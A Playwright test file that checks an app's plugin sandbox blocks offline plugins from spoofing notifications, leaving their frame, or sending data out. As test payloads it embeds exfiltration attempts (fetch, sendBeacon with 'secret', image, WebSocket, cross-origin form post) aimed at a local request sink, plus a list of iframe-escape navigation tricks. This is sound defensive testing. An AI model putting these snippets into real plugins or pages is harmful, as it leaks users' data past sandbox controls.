import {expect, test as base} from '@playwright/test';
import {
  addPluginViaStudio, enablePlugins, openNewPluginStudio, pasteIntoStudio, pluginHtml, previewInStudio, startRequestSink, type RequestSink,
} from './plugin-helpers';

const test = base.extend<{sink: RequestSink}>({
  // eslint-disable-next-line no-empty-pattern
  sink: async ({}, use) => {
    const sink = await startRequestSink();
    await use(sink);
    await sink.close();
  },
});

test.beforeEach(async ({page}) => enablePlugins(page));

test('a plugin cannot post the app its own window events', async ({page}) => {
  await addPluginViaStudio(page, [
    '<!DOCTYPE html><html><head><title>Spoof test</title></head><body>',
    '<div id="status">idle</div>',
    '<script>',
    '  parent.postMessage({type: "notification", message: "spoofed toast"}, "*");',
    '  fwlite.ready.then(async () => {',
    '    document.getElementById("status").textContent = "counted:" + await fwlite.countEntries();',
    '  });',
    '</script>',
    '</body></html>',
  ].join('\n'));

  const card = page.locator('[data-slot="card"]', {hasText: 'Spoof test'});
  await card.getByRole('button', {name: 'Run'}).click();

  const frame = page.frameLocator('iframe[title="Spoof test"]');
  await expect(frame.locator('#status')).toContainText('counted:', {timeout: 15000});
  await expect(page.getByText('spoofed toast')).toHaveCount(0);
});

test('an offline plugin cannot send data out', async ({page, sink}) => {
  await addPluginViaStudio(page, [
    '<!DOCTYPE html><html><head><title>Exfil test</title></head><body>',
    '<div id="status">idle</div><div id="violations"></div>',
    '<script>',
    '  const violations = new Set();',
    '  document.addEventListener("securitypolicyviolation", (e) => {',
    '    violations.add(e.effectiveDirective);',
    '    document.getElementById("violations").textContent = [...violations].sort().join(" ");',
    '  });',
    '  const attempts = [',
    `    () => fetch("${sink.url}/fetch").catch(() => {}),`,
    `    () => navigator.sendBeacon("${sink.url}/beacon", "secret"),`,
    `    () => { new Image().src = "${sink.url}/image"; },`,
    `    () => new WebSocket("ws://127.0.0.1:${sink.port}/ws"),`,
    '  ];',
    '  for (const attempt of attempts) { try { attempt(); } catch {} }',
    '  document.getElementById("status").textContent = "done";',
    '</script>',
    '</body></html>',
  ].join('\n'));

  const card = page.locator('[data-slot="card"]', {hasText: 'Exfil test'});
  await card.getByRole('button', {name: 'Run'}).click();

  const frame = page.frameLocator('iframe[title="Exfil test"]');
  await expect(frame.locator('#status')).toHaveText('done', {timeout: 15000});
  for (const directive of ['connect-src', 'img-src']) {
    await expect(frame.locator('#violations')).toContainText(directive);
  }
  // Give any request that slipped past the CSP time to land before asserting none did.
  await page.waitForTimeout(1000);
  expect(sink.requests).toEqual([]);
});

test('an offline plugin cannot submit a form to another origin', async ({page, sink}) => {
  await previewInStudio(page, pluginHtml('Form test', {
    body: [
      `<form id="form" method="post" action="${sink.url}/form"><input name="secret" value="x"></form>`,
      '<div id="refused"></div>',
      '<script>',
      '  document.addEventListener("securitypolicyviolation", (e) => {',
      '    document.getElementById("refused").textContent = e.effectiveDirective;',
      '  });',
      '  document.getElementById("form").submit();',
      '</script>',
    ].join('\n'),
  }));

  // WebKit refuses inside the plugin (form-action). Chromium checks the page's frame-src first, which stops the plugin.
  const refusedInPlugin = page.frameLocator('iframe[title="Form test"]').getByText('form-action');
  const stopped = page.getByText('Plugin stopped');
  await expect.poll(async () => sink.requests.length > 0 || await refusedInPlugin.isVisible() || await stopped.isVisible()).toBe(true);
  expect(sink.requests).toEqual([]);
});

// Each runs as the plugin's first script, so before its frame's first `load`.
const waysOutOfTheFrame = {
  'location.href': 'location.href = url;',
  'location.replace': 'location.replace(url);',
  'window.open on itself': 'window.open(url, "_self");',
  'a meta refresh': 'const meta = document.createElement("meta"); meta.httpEquiv = "refresh"; meta.content = "0;url=" + url; document.head.append(meta);',
  'a link click': 'const a = document.createElement("a"); a.href = url; document.head.append(a); a.click();',
  'a download link': 'const a = document.createElement("a"); a.href = url; a.download = "x.txt"; document.head.append(a); a.click();',
};

test('an offline plugin cannot leave its frame', async ({page, sink}) => {
  await openNewPluginStudio(page);
  // One page load for all of them: each pasted version restarts the preview.
  for (const [name, leave] of Object.entries(waysOutOfTheFrame)) {
    await test.step(name, async () => {
      const title = `Leaves by ${name}`;
      await pasteIntoStudio(page, pluginHtml(title, {
        head: `<script>const url = "${sink.url}/escaped"; ${leave}</script>`,
        body: '<h1>Still here</h1>',
      }));

      // The attempt ends one of two ways: the app stops the plugin, or the request gets out.
      const stopped = page.getByText(`“${title}” tried to leave its sandbox page`);
      await expect.poll(async () => sink.requests.length > 0 || await stopped.isVisible()).toBe(true);
      expect.soft(sink.requests, `requests that got out through ${name}`).toEqual([]);
      await expect.soft(stopped).toBeVisible();
      sink.requests.length = 0;
    });
  }
});

test('a plugin with the internet permission can still fetch', async ({page, sink}) => {
  await previewInStudio(page, pluginHtml('Online test', {
    head: '<meta name="fwlite-plugin-permissions" content="internet">',
    body: [
      '<div id="status">idle</div>',
      '<script>',
      `  fetch("${sink.url}/fetch").then((response) => response.text()).then((text) => {`,
      '    document.getElementById("status").textContent = "fetched:" + text;',
      '  });',
      '</script>',
    ].join('\n'),
  }));
  await page.getByTestId('plugin-internet-prompt').getByRole('button', {name: 'Allow and run it'}).click();

  await expect(page.frameLocator('iframe[title="Online test"]').locator('#status')).toHaveText('fetched:ok');
  expect(sink.requests).toEqual(['GET /fetch']);
});
